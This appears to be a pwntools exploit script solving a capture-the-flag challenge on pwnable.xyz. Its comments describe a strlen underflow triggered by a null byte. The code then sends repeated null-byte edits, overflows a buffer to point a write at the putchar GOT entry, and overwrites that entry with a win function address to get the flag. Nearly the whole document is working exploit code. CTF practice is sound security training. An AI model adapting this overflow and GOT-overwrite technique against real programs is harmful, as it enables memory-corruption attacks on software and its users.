###fmt is red herring
###strlen can be controlled by null, resulting in strlen(A)-1 = -1
###Which further leads to increase of input size

from pwn import *

###Util
def edit_name(data):
    r.sendlineafter('> ','1')
    r.sendafter('Name: ',data)

def edit_desc(data):
    r.sendlineafter('> ','2')
    r.sendafter('Desc: ',data)

def get_flag():
    r.sendlineafter('> ','3')

###Addr
putchar_got = 0x602020
win = 0x40094c

###Exploit
r = remote('svc.pwnable.xyz',30013)

r.sendafter('Name: ',b'\x00')
r.sendafter('Desc: ','M30W')
for i in range(8):
    edit_name(b'\x00')
edit_name(b'\x00'*0x80+p64(putchar_got))
edit_desc(p64(win))

get_flag()
r.interactive()
